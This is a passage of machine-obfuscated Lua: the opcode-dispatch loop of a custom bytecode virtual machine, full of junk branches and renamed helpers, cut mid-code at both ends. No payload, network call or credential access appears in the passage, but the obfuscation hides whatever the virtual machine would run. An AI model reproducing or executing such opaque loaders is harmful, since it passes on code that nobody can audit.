d[e[t]]=d[e[l]]+e[r];end end else if f<=53 then if f>=50 then for n=38,87 do if 52<f then local n=e[t];local t=d[e[l]];d[n+1]=t;d[n]=t[e[r]];break;end;a[e[l]]=d[e[t]];break;end;else a[e[l]]=d[e[t]];end else if f>54 then if f==55 then local e=e[t]d[e]=d[e](h(d,e+1,s))else local f;d[e[t]]=d[e[l]];n=n+1;e=p[n];f=e[t]d[f](d[f+1])n=n+1;e=p[n];d[e[t]]=a[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;n=n+1;e=p[n];for e=e[t],e[l]do d[e]=nil;end;end else local f;d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];f=e[t]d[f]=d[f](d[f+1])n=n+1;e=p[n];d[e[t]][d[e[l]]]=d[e[r]];n=n+1;e=p[n];do return end;end end end else if f<=46 then if 43<f then if f<45 then local f,s,o,r,f,f,u,c,_,g,k,b,a;for f=0,6 do if 3<=f then if f<5 then if f~=2 then repeat if 4>f then f=0;while f>-1 do if f<3 then if 1>f then c=e;else if f==1 then s=t;else o=l;end end else if f<=4 then if f>1 then for e=12,69 do if 4>f then r=c[o];break;end;a=c[s];break;end;else r=c[o];end else if f>4 then for e=23,76 do if f<6 then d(a,r);break;end;f=-2;break;end;else d(a,r);end end end f=f+1 end n=n+1;e=p[n];break;end;f=0;while f>-1 do if f<3 then if f>0 then if f<2 then s=t;else o=l;end else c=e;end else if 4>=f then if f>-1 then repeat if 4~=f then r=c[o];break;end;a=c[s];until true;else r=c[o];end else if f~=6 then d(a,r);else f=-2;end end end f=f+1 end n=n+1;e=p[n];until true;else f=0;while f>-1 do if f<3 then if 1>f then c=e;else if f==1 then s=t;else o=l;end end else if f<=4 then if f>1 then for e=12,69 do if 4>f then r=c[o];break;end;a=c[s];break;end;else r=c[o];end else if f>4 then for e=23,76 do if f<6 then d(a,r);break;end;f=-2;break;end;else d(a,r);end end end f=f+1 end n=n+1;e=p[n];end else if f>4 then repeat if 5<f then f=0;while f>-1 do if f<4 then if 2>f then if-2<=f then for n=14,60 do if f~=0 then _=t;break;end;c=e;break;end;else _=t;end else if 1<=f then repeat if 2~=f then k=d;break;end;g=l;until true;else k=d;end end else if f>5 then if 3~=f then for e=30,89 do if f~=6 then f=-2;break;end;d[a]=b;break;end;else f=-2;end else if 3<f then repeat if f<5 then b=k[c[g]];break;end;a=c[_];until true;else a=c[_];end end end f=f+1 end break;end;u=e[t]d[u]=d[u](h(d,u+1,e[l]))n=n+1;e=p[n];until true;else u=e[t]d[u]=d[u](h(d,u+1,e[l]))n=n+1;e=p[n];end end else if f<=0 then f=0;while f>-1 do if f>=3 then if 4>=f then if f>0 then for e=29,56 do if 3<f then a=c[s];break;end;r=c[o];break;end;else r=c[o];end else if f>=2 then for e=49,77 do if f~=6 then d(a,r);break;end;f=-2;break;end;else d(a,r);end end else if f>0 then if 2>f then s=t;else o=l;end else c=e;end end f=f+1 end n=n+1;e=p[n];else if f>-2 then for h=44,98 do if f~=1 then f=0;while f>-1 do if f>=3 then if 5<=f then if f>5 then f=-2;else d(a,r);end else if f==3 then r=c[o];else a=c[s];end end else if f>=1 then if 2~=f then s=t;else o=l;end else c=e;end end f=f+1 end n=n+1;e=p[n];break;end;f=0;while f>-1 do if f>=3 then if 5<=f then if f~=6 then d(a,r);else f=-2;end else if 3==f then r=c[o];else a=c[s];end end else if 0>=f then c=e;else if-2~=f then repeat if 2~=f then s=t;break;end;o=l;until true;else s=t;end end end f=f+1 end n=n+1;e=p[n];break;end;else f=0;while f>-1 do if f>=3 then if 5<=f then if f>5 then f=-2;else d(a,r);end else if f==3 then r=c[o];else a=c[s];end end else if f>=1 then if 2~=f then s=t;else o=l;end else c=e;end end f=f+1 end n=n+1;e=p[n];end end end end else if f~=44 then repeat if 46>f then d[e[t]]=d[e[l]][e[r]];break;end;if(d[e[t]]==d[e[r]])then n=n+1;else n=e[l];end;until true;else d[e[t]]=d[e[l]][e[r]];end end else if f==42 then d[e[t]]=d[e[l]]-d[e[r]];else local c,s,o,h,a,f;for f=0,6 do if f<3 then if f>=1 then if-2~=f then repeat if 1<f then f=0;while f>-1 do if f<=2 then if f>=1 then if 2~=f then s=t;else o=l;end else c=e;end else if 4<f then if 4~=f then repeat if f<6 then d(a,h);break;end;f=-2;until true;else d(a,h);end else if 2<f then for e=31,98 do if 4>f then h=c[o];break;end;a=c[s];break;end;else h=c[o];end end end f=f+1 end n=n+1;e=p[n];break;end;f=0;while f>-1 do if 2<f then if f>=5 then if 6==f then f=-2;else d(a,h);end else if 0<f then for e=47,88 do if 3~=f then a=c[s];break;end;h=c[o];break;end;else a=c[s];end end else if 1>f then c=e;else if-2~=f then repeat if f~=2 then s=t;break;end;o=l;until true;else s=t;end end end f=f+1 end n=n+1;e=p[n];until true;else f=0;while f>-1 do if f<=2 then if f>=1 then if 2~=f then s=t;else o=l;end else c=e;end else if 4<f then if 4~=f then repeat if f<6 then d(a,h);break;end;f=-2;until true;else d(a,h);end else if 2<f then for e=31,98 do if 4>f then h=c[o];break;end;a=c[s];break;end;else h=c[o];end end end f=f+1 end n=n+1;e=p[n];end else d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];end else if 5>f then if f==3 then f=0;while f>-1 do if 2>=f then if f>=1 then if f>0 then repeat if 1<f then o=l;break;end;s=t;until true;else o=l;end else c=e;end else if 5>f then if f==3 then h=c[o];else a=c[s];end else if 6==f then f=-2;else d(a,h);end end end f=f+1 end n=n+1;e=p[n];else d[e[t]]=#d[e[l]];n=n+1;e=p[n];end else if f>=1 then for u=17,97 do if f~=6 then d[e[t]]=d[e[l]]-d[e[r]];n=n+1;e=p[n];break;end;f=0;while f>-1 do if 2<f then if f>4 then if f>1 then for e=26,91 do if f<6 then d(a,h);break;end;f=-2;break;end;else d(a,h);end else if-1<f then for e=37,88 do if f<4 then h=c[o];break;end;a=c[s];break;end;else a=c[s];end end else if 0>=f then c=e;else if f==2 then o=l;else s=t;end end end f=f+1 end break;end;else d[e[t]]=d[e[l]]-d[e[r]];n=n+1;e=p[n];end end end end end end else if 49<=f then if f<=49 then local c,h,a,o,s,u,f;d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];f=0;while f>-1 do if 3<f then if f>5 then if 3<=f then for e=20,69 do if f>6 then f=-2;break;end;d[u]=s;break;end;else f=-2;end else if 4~=f then u=c[h];else s=o[c[a]];end end else if f<=1 then if-3<=f then repeat if 0<f then h=t;break;end;c=e;until true;else h=t;end else if f>=-1 then repeat if 2~=f then o=d;break;end;a=l;until true;else a=l;end end end f=f+1 end n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;else if f>47 then for c=28,90 do if 50<f then local p=e[t];local t={};for e=1,#u do local e=u[e];for n=0,#e do local e=e[n];local l=e[1];local n=e[2];if l==d and n>=p then t[n]=l[n];e[1]=t;end;end;end;break;end;for f=0,1 do if-3<f then repeat if 1>f then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;if d[e[t]]then n=n+1;else n=e[l];end;until true;else if d[e[t]]then n=n+1;else n=e[l];end;end end break;end;else local p=e[t];local l={};for e=1,#u do local e=u[e];for n=0,#e do local e=e[n];local t=e[1];local n=e[2];if t==d and n>=p then l[n]=t[n];e[1]=l;end;end;end;end end else if 45~=f then repeat if f<48 then local n=e[t];local t=d[n];for e=n+1,e[l]do c.OszS_ida(t,d[e])end;break;end;if d[e[t]]then n=n+1;else n=e[l];end;until true;else if d[e[t]]then n=n+1;else n=e[l];end;end end end end else if f>=74 then if 78>=f then if 75<f then if 76<f then if 76~=f then for n=10,84 do if f<78 then local e=e[t];local n=d[e];for e=e+1,s do c.OszS_ida(n,d[e])end;break;end;d[e[t]][e[l]]=d[e[r]];break;end;else local e=e[t];local n=d[e];for e=e+1,s do c.OszS_ida(n,d[e])end;end else for f=0,1 do if 0~=f then if d[e[t]]then n=n+1;else n=e[l];end;else d[e[t]]=a[e[l]];n=n+1;e=p[n];end end end else if f>74 then local t=e[t];local f=d[t+2];local p=d[t]+f;d[t]=p;if(f>0)then if(p<=d[t+1])then n=e[l];d[t+3]=p;end elseif(p>=d[t+1])then n=e[l];d[t+3]=p;end else local o,f,s,k,_,a,u,h,c;local p=0;while p>-1 do if p<=2 then if p>0 then if p==1 then f=e;s=n;else k=f[t];_=f[r];a=l;end else o=d;end else if p<=4 then if 0~=p then repeat if p~=4 then u=o[k];h=o[_];break;end;c=u==h and f[a]or 1+s;until true;else c=u==h and f[a]or 1+s;end else if 5~=p then p=-2;else n=c;end end end p=p+1 end end end else if 82<=f then if f>82 then if 81<=f then for p=24,93 do if f~=84 then local t=e[t];local p=d[t]local f=d[t+2];if(f>0)then if(p>d[t+1])then n=e[l];else d[t+3]=p;end elseif(p<d[t+1])then n=e[l];else d[t+3]=p;end break;end;local t=e[t];local f=d[t+2];local p=d[t]+f;d[t]=p;if(f>0)then if(p<=d[t+1])then n=e[l];d[t+3]=p;end elseif(p>=d[t+1])then n=e[l];d[t+3]=p;end break;end;else local t=e[t];local p=d[t]local f=d[t+2];if(f>0)then if(p>d[t+1])then n=e[l];else d[t+3]=p;end elseif(p<d[t+1])then n=e[l];else d[t+3]=p;end end else local c,f;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=d[e[l]]+d[e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]]%e[r];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];c=e[l];f=d[c]for e=c+1,e[r]do f=f..d[e];end;d[e[t]]=f;end else if 79>=f then local c;for f=0,4 do if 1>=f then if-3<=f then for c=10,84 do if 0<f then d(e[t],e[l]);n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]];n=n+1;e=p[n];break;end;else d[e[t]]=d[e[l]];n=n+1;e=p[n];end else if f<=2 then d(e[t],e[l]);n=n+1;e=p[n];else if f~=3 then if(d[e[t]]==e[r])then n=n+1;else n=e[l];end;else c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];end end end end else if f~=78 then repeat if 80<f then local f;d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];f=e[t];do return d[f](h(d,f+1,e[l]))end;n=n+1;e=p[n];f=e[t];do return h(d,f,s)end;n=n+1;e=p[n];do return end;break;end;d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=(e[l]~=0);n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][e[r]];until true;else d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=(e[l]~=0);n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][e[r]];end end end end else if f<=67 then if 65>f then if f>62 then repeat if 64~=f then local f;for c=0,6 do if 2<c then if c>=5 then if c>3 then for r=10,79 do if 6>c then d[e[t]]=d[e[l]];n=n+1;e=p[n];break;end;f=e[t]d[f](h(d,f+1,e[l]))break;end;else f=e[t]d[f](h(d,f+1,e[l]))end else if 0<=c then repeat if 3<c then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;d[e[t]]=o[e[l]];n=n+1;e=p[n];until true;else d[e[t]]=o[e[l]];n=n+1;e=p[n];end end else if c>0 then if-1~=c then for r=37,55 do if 1~=c then d[e[t]]=a[e[l]];n=n+1;e=p[n];break;end;f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];break;end;else d[e[t]]=a[e[l]];n=n+1;e=p[n];end else d[e[t]][e[l]]=d[e[r]];n=n+1;e=p[n];end end end break;end;local f;f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);until true;else local f;f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);end else if 65>=f then local c;for f=0,5 do if f>2 then if f>=4 then if 4==f then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];else d[e[t]][d[e[l]]]=d[e[r]];end else d[e[t]][d[e[l]]]=d[e[r]];n=n+1;e=p[n];end else if f>0 then if-1<=f then repeat if f~=2 then d[e[t]]=d[e[l]];n=n+1;e=p[n];break;end;c=e[t]d[c]=d[c](d[c+1])n=n+1;e=p[n];until true;else d[e[t]]=d[e[l]];n=n+1;e=p[n];end else d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];end end end else if f>=64 then repeat if 66~=f then for f=0,6 do if 2>=f then if 0>=f then d[e[t]]=d[e[l]];n=n+1;e=p[n];else if 1==f then d[e[t]]=d[e[l]];n=n+1;e=p[n];else d(e[t],e[l]);n=n+1;e=p[n];end end else if f<5 then if f>-1 then for c=24,72 do if 3~=f then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else d(e[t],e[l]);n=n+1;e=p[n];end else if f~=6 then d(e[t],e[l]);n=n+1;e=p[n];else d(e[t],e[l]);end end end end break;end;d[e[t]]=d[e[l]]-d[e[r]];until true;else d[e[t]]=d[e[l]]-d[e[r]];end end end else if 71>f then if f<69 then local h,f,o,s,u,c,k,_,a;local p=0;while p>-1 do if 2>=p then if 0<p then if 0~=p then for d=32,96 do if p~=2 then f=e;o=n;break;end;s=f[t];u=f[r];c=l;break;end;else s=f[t];u=f[r];c=l;end else h=d;end else if 5>p then if 0<p then repeat if 4~=p then k=h[s];_=h[u];break;end;a=k==_ and f[c]or 1+o;until true;else a=k==_ and f[c]or 1+o;end else if p~=2 then repeat if 5<p then p=-2;break;end;n=a;until true;else p=-2;end end end p=p+1 end else if f>68 then repeat if 69~=f then local h,o,u,_,s,a,f,c;for f=0,3 do if f<=1 then if-1<f then repeat if f~=0 then c=e[t]d[c]=d[c](d[c+1])n=n+1;e=p[n];break;end;f=0;while f>-1 do if f<=3 then if 2<=f then if 3~=f then u=l;else _=d;end else if f>-4 then repeat if f~=0 then o=t;break;end;h=e;until true;else h=e;end end else if f>=6 then if 2<f then for e=30,71 do if f~=6 then f=-2;break;end;d[a]=s;break;end;else d[a]=s;end else if f~=2 then for e=47,61 do if 4~=f then a=h[o];break;end;s=_[h[u]];break;end;else a=h[o];end end end f=f+1 end n=n+1;e=p[n];until true;else c=e[t]d[c]=d[c](d[c+1])n=n+1;e=p[n];end else if-2<=f then for c=14,87 do if 3>f then d[e[t]][d[e[l]]]=d[e[r]];n=n+1;e=p[n];break;end;d[e[t]][d[e[l]]]=d[e[r]];break;end;else d[e[t]][d[e[l]]]=d[e[r]];end end end break;end;local f;d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];f=e[t]d[f]=d[f](d[f+1])n=n+1;e=p[n];if not d[e[t]]then n=n+1;else n=e[l];end;until true;else local f;d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];f=e[t]d[f]=d[f](d[f+1])n=n+1;e=p[n];if not d[e[t]]then n=n+1;else n=e[l];end;end end else if 71<f then if f~=70 then for n=15,79 do if f~=72 then for e=e[t],e[l]do d[e]=nil;end;break;end;do return end;break;end;else do return end;end else d[e[t]]=d[e[l]]%e[r];end end end end end end else if f>127 then if f<=148 then if f>=138 then if f<143 then if f<140 then if f>134 then for p=24,55 do if 138<f then if(d[e[t]]~=e[r])then n=n+1;else n=e[l];end;break;end;d[e[t]]=d[e[l]]*e[r];break;end;else if(d[e[t]]~=e[r])then n=n+1;else n=e[l];end;end else if f>=141 then if f>139 then repeat if 142>f then local e=e[t]d[e](d[e+1])break;end;local c,_,r,s,a,u,f,k;for f=0,6 do if 3>f then if 1>f then d[e[t]]=o[e[l]];n=n+1;e=p[n];else if 1<f then d[e[t]]=o[e[l]];n=n+1;e=p[n];else d[e[t]]=o[e[l]];n=n+1;e=p[n];end end else if f>4 then if f~=4 then repeat if 5~=f then k=e[t]d[k]=d[k](h(d,k+1,e[l]))break;end;f=0;while f>-1 do if 3>=f then if f<=1 then if f>-3 then repeat if f~=1 then c=e;break;end;_=t;until true;else _=t;end else if f>=0 then for e=40,68 do if 3>f then r=l;break;end;s=d;break;end;else r=l;end end else if f>=6 then if 4<=f then repeat if f~=7 then d[u]=a;break;end;f=-2;until true;else f=-2;end else if 4<f then u=c[_];else a=s[c[r]];end end end f=f+1 end n=n+1;e=p[n];until true;else f=0;while f>-1 do if 3>=f then if f<=1 then if f>-3 then repeat if f~=1 then c=e;break;end;_=t;until true;else _=t;end else if f>=0 then for e=40,68 do if 3>f then r=l;break;end;s=d;break;end;else r=l;end end else if f>=6 then if 4<=f then repeat if f~=7 then d[u]=a;break;end;f=-2;until true;else f=-2;end else if 4<f then u=c[_];else a=s[c[r]];end end end f=f+1 end n=n+1;e=p[n];end else if 0<f then repeat if f<4 then f=0;while f>-1 do if 3<f then if 5<f then if f<7 then d[u]=a;else f=-2;end else if f>=2 then for e=21,56 do if f<5 then a=s[c[r]];break;end;u=c[_];break;end;else a=s[c[r]];end end else if 2>f then if 0<f then _=t;else c=e;end else if f==3 then s=d;else r=l;end end end f=f+1 end n=n+1;e=p[n];break;end;f=0;while f>-1 do if f>=4 then if 6>f then if f>=3 then for e=26,57 do if f<5 then a=s[c[r]];break;end;u=c[_];break;end;else a=s[c[r]];end else if f>2 then repeat if f>6 then f=-2;break;end;d[u]=a;until true;else d[u]=a;end end else if 2<=f then if 0~=f then for e=21,91 do if 2<f then s=d;break;end;r=l;break;end;else s=d;end else if-2<=f then repeat if f~=0 then _=t;break;end;c=e;until true;else c=e;end end end f=f+1 end n=n+1;e=p[n];until true;else f=0;while f>-1 do if f>=4 then if 6>f then if f>=3 then for e=26,57 do if f<5 then a=s[c[r]];break;end;u=c[_];break;end;else a=s[c[r]];end else if f>2 then repeat if f>6 then f=-2;break;end;d[u]=a;until true;else d[u]=a;end end else if 2<=f then if 0~=f then for e=21,91 do if 2<f then s=d;break;end;r=l;break;end;else s=d;end else if-2<=f then repeat if f~=0 then _=t;break;end;c=e;until true;else c=e;end end end f=f+1 end n=n+1;e=p[n];end end end end until true;else local e=e[t]d[e](d[e+1])end else do return end;end end else if f<146 then if f>=144 then if f~=142 then for n=17,86 do if f<145 then o[e[l]]=d[e[t]];break;end;do return d[e[t]]end break;end;else do return d[e[t]]end end else local c,r,s,a,o,h,f,_,j,g,k,y,b;f=0;while f>-1 do if f<=3 then if f>1 then if f>0 then repeat if f<3 then s=l;break;end;a=d;until true;else s=l;end else if f~=-1 then for n=21,83 do if 0<f then r=t;break;end;c=e;break;end;else r=t;end end else if f<=5 then if 5~=f then o=a[c[s]];else h=c[r];end else if 3<=f then repeat if f>6 then f=-2;break;end;d[h]=o;until true;else d[h]=o;end end end f=f+1 end n=n+1;e=p[n];f=0;while f>-1 do if 4<=f then if f<=5 then if f~=5 then o=a[c[s]];else h=c[r];end else if f~=2 then repeat if f~=7 then d[h]=o;break;end;f=-2;until true;else d[h]=o;end end else if f<2 then if f~=-4 then for n=25,59 do if f~=0 then r=t;break;end;c=e;break;end;else r=t;end else if 0~=f then repeat if 3~=f then s=l;break;end;a=d;until true;else a=d;end end end f=f+1 end n=n+1;e=p[n];_=e[t]d[_]=d[_](d[_+1])n=n+1;e=p[n];f=0;while f>-1 do if 4>f then if f>=2 then if f>1 then repeat if 2~=f then a=d;break;end;s=l;until true;else a=d;end else if f>=-2 then for n=21,96 do if 0~=f then r=t;break;end;c=e;break;end;else r=t;end end else if f<=5 then if 5~=f then o=a[c[s]];else h=c[r];end else if 6~=f then f=-2;else d[h]=o;end end end f=f+1 end n=n+1;e=p[n];do return d[e[t]]end n=n+1;e=p[n];_=e[t];j={};for e=1,#u do g=u[e];for e=0,#g do k=g[e];y=k[1];b=k[2];if y==d and b>=_ then j[b]=y[b];k[1]=j;end;end;end;n=n+1;e=p[n];n=e[l];end else if 147>f then local f;d[e[t]]=d[e[l]];n=n+1;e=p[n];f=e[t]d[f](d[f+1])n=n+1;e=p[n];d[e[t]]=a[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;n=n+1;e=p[n];for e=e[t],e[l]do d[e]=nil;end;else if 145~=f then for c=42,53 do if 147<f then local c;for f=0,6 do if 2>=f then if 0<f then if f~=0 then repeat if f>1 then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];until true;else d(e[t],e[l]);n=n+1;e=p[n];end else d(e[t],e[l]);n=n+1;e=p[n];end else if f<5 then if f>=1 then repeat if 3~=f then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];until true;else d(e[t],e[l]);n=n+1;e=p[n];end else if 2<=f then for a=48,62 do if f~=6 then c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]][d[e[r]]];break;end;else c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];end end end end break;end;for f=0,3 do if f<=1 then if f>-4 then for c=15,84 do if f<1 then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else d(e[t],e[l]);n=n+1;e=p[n];end else if f==2 then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];else if not d[e[t]]then n=n+1;else n=e[l];end;end end end break;end;else for f=0,3 do if f<=1 then if f>-4 then for c=15,84 do if f<1 then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else d(e[t],e[l]);n=n+1;e=p[n];end else if f==2 then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];else if not d[e[t]]then n=n+1;else n=e[l];end;end end end end end end end else if f>=133 then if f<=134 then if f>133 then local c,b,a,s,_,o,u,k,f;for f=0,5 do if 2<f then if 3>=f then c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];else if f>0 then repeat if f>4 then d[e[t]]=d[e[l]]+d[e[r]];break;end;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];until true;else d[e[t]]=d[e[l]]+d[e[r]];end end else if f<=0 then c=e[t];b=d[e[l]];d[c+1]=b;d[c]=b[e[r]];n=n+1;e=p[n];else if 2~=f then f=0;while f>-1 do if f<4 then if 1<f then if-2<=f then repeat if 3>f then _=l;break;end;o=d;until true;else o=d;end else if-3<f then repeat if 1~=f then a=e;break;end;s=t;until true;else s=t;end end else if 5<f then if 4<f then for e=36,72 do if f>6 then f=-2;break;end;d[k]=u;break;end;else f=-2;end else if f>1 then repeat if f~=4 then k=a[s];break;end;u=o[a[_]];until true;else u=o[a[_]];end end end f=f+1 end n=n+1;e=p[n];else f=0;while f>-1 do if f>=4 then if f<6 then if f~=5 then u=o[a[_]];else k=a[s];end else if 4<=f then for e=29,82 do if 7~=f then d[k]=u;break;end;f=-2;break;end;else f=-2;end end else if 1<f then if 2~=f then o=d;else _=l;end else if-1<f then for n=32,79 do if 1~=f then a=e;break;end;s=t;break;end;else s=t;end end end f=f+1 end n=n+1;e=p[n];end end end end else d[e[t]]=d[e[l]]+d[e[r]];end else if 135<f then if 137>f then local s=y[e[l]];local h;local f={};h=c.KUKtaFau({},{__index=function(n,e)local e=f[e];return e[1][e[2]];end,__newindex=function(d,e,n)local e=f[e]e[1][e[2]]=n;end;});for t=1,e[r]do n=n+1;local e=p[n];if e[m]==61 then f[t-1]={d,e[l]};else f[t-1]={o,e[l]};end;u[#u+1]=f;end;d[e[t]]=b(s,h,a);else if(d[e[t]]==e[r])then n=n+1;else n=e[l];end;end else for e=e[t],e[l]do d[e]=nil;end;end end else if f>129 then if f<131 then local f,c;f=e[t];c=d[e[l]];d[f+1]=c;d[f]=c[e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=d[e[l]]*e[r];else if f>127 then repeat if f~=131 then local e=e[t];do return h(d,e,s)end;break;end;local e=e[t];s=e+z-1;for n=e,s do local e=g[n-e];d[n]=e;end;until true;else local e=e[t];do return h(d,e,s)end;end end else if f>=127 then for n=10,97 do if f~=129 then d[e[t]]=d[e[l]][e[r]];break;end;local p,f,r,h,c;local n=0;while n>-1 do if 2<n then if n<=4 then if 0~=n then repeat if n~=4 then h=p[r];break;end;c=p[f];until true;else c=p[f];end else if 5~=n then n=-2;else d(c,h);end end else if 1>n then p=e;else if n~=2 then f=t;else r=l;end end end n=n+1 end break;end;else local p,c,h,r,f;local n=0;while n>-1 do if 2<n then if n<=4 then if 0~=n then repeat if n~=4 then r=p[h];break;end;f=p[c];until true;else f=p[c];end else if 5~=n then n=-2;else d(f,r);end end else if 1>n then p=e;else if n~=2 then c=t;else h=l;end end end n=n+1 end end end end end else if 159>=f then if 153<f then if 156<f then if f>157 then if 159~=f then local f;for c=0,2 do if 0>=c then f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];else if 0~=c then repeat if c>1 then d[e[t]][d[e[l]]]=d[e[r]];break;end;d[e[t]]=d[e[l]]-e[r];n=n+1;e=p[n];until true;else d[e[t]][d[e[l]]]=d[e[r]];end end end else d[e[t]]();end else n=e[l];end else if 154<f then if 156>f then local c;for f=0,6 do if f>=3 then if 4>=f then if f>=1 then repeat if 4~=f then d[e[t]]={};n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]];n=n+1;e=p[n];until true;else d[e[t]]={};n=n+1;e=p[n];end else if f~=4 then for c=21,55 do if f~=6 then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);break;end;else d(e[t],e[l]);end end else if 0<f then if f<2 then d(e[t],e[l]);n=n+1;e=p[n];else c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];end else d(e[t],e[l]);n=n+1;e=p[n];end end end else local e=e[t];do return h(d,e,s)end;end else local e=e[t]d[e](d[e+1])end end else if f<151 then if 145<f then for c=24,70 do if 150~=f then local f,c,r;for h=0,2 do if 1<=h then if h~=-2 then for a=46,81 do if 2>h then d(e[t],e[l]);n=n+1;e=p[n];break;end;f=e[t];c=d[f]r=d[f+2];if(r>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end break;end;else f=e[t];c=d[f]r=d[f+2];if(r>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end end else d[e[t]]=#d[e[l]];n=n+1;e=p[n];end end break;end;local n=e[t]d[n](h(d,n+1,e[l]))break;end;else local f,c,r;for h=0,2 do if 1<=h then if h~=-2 then for a=46,81 do if 2>h then d(e[t],e[l]);n=n+1;e=p[n];break;end;f=e[t];c=d[f]r=d[f+2];if(r>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end break;end;else f=e[t];c=d[f]r=d[f+2];if(r>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end end else d[e[t]]=#d[e[l]];n=n+1;e=p[n];end end end else if 151>=f then if not d[e[t]]then n=n+1;else n=e[l];end;else if f~=153 then local s=y[e[l]];local h;local f={};h=c.KUKtaFau({},{__index=function(n,e)local e=f[e];return e[1][e[2]];end,__newindex=function(d,e,n)local e=f[e]e[1][e[2]]=n;end;});for t=1,e[r]do n=n+1;local e=p[n];if e[m]==61 then f[t-1]={d,e[l]};else f[t-1]={o,e[l]};end;u[#u+1]=f;end;d[e[t]]=b(s,h,a);else if not d[e[t]]then n=n+1;else n=e[l];end;end end end end else if 164>=f then if f>=162 then if f<=162 then local n=e[t]local t,e=k(d[n](h(d,n+1,e[l])))s=e+n-1 local e=0;for n=n,s do e=e+1;d[n]=t[e];end;else if f~=160 then repeat if f<164 then local c;for f=0,6 do if 3<=f then if f<5 then if f>=1 then for h=43,59 do if 4>f then 